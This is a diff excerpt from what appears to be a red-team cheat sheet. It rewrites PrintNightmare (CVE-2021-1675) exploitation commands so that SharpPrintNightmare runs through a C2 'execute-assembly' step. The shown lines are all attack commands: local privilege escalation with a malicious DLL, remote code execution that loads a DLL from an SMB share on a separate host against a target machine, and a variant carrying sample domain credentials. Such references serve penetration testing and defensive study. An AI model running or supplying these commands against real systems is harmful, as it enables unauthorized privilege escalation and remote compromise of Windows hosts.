@@ -89,13 +89,13 @@ execute-assembly C:\Watson.exe
 # PowerShell PrintNightmare local priv esc: https://github.com/calebstewart/CVE-2021-1675
 
 # Local priv esc
-C:\SharpPrintNightmare.exe C:\addCube.dll
+execute-assembly C:\SharpPrintNightmare.exe C:\addCube.dll
 
 # RCE using existing context
-SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'
+execute-assembly C:\SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'
 
 # RCE using runas /netonly
-SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
+execute-assembly C:\SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
 ```
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
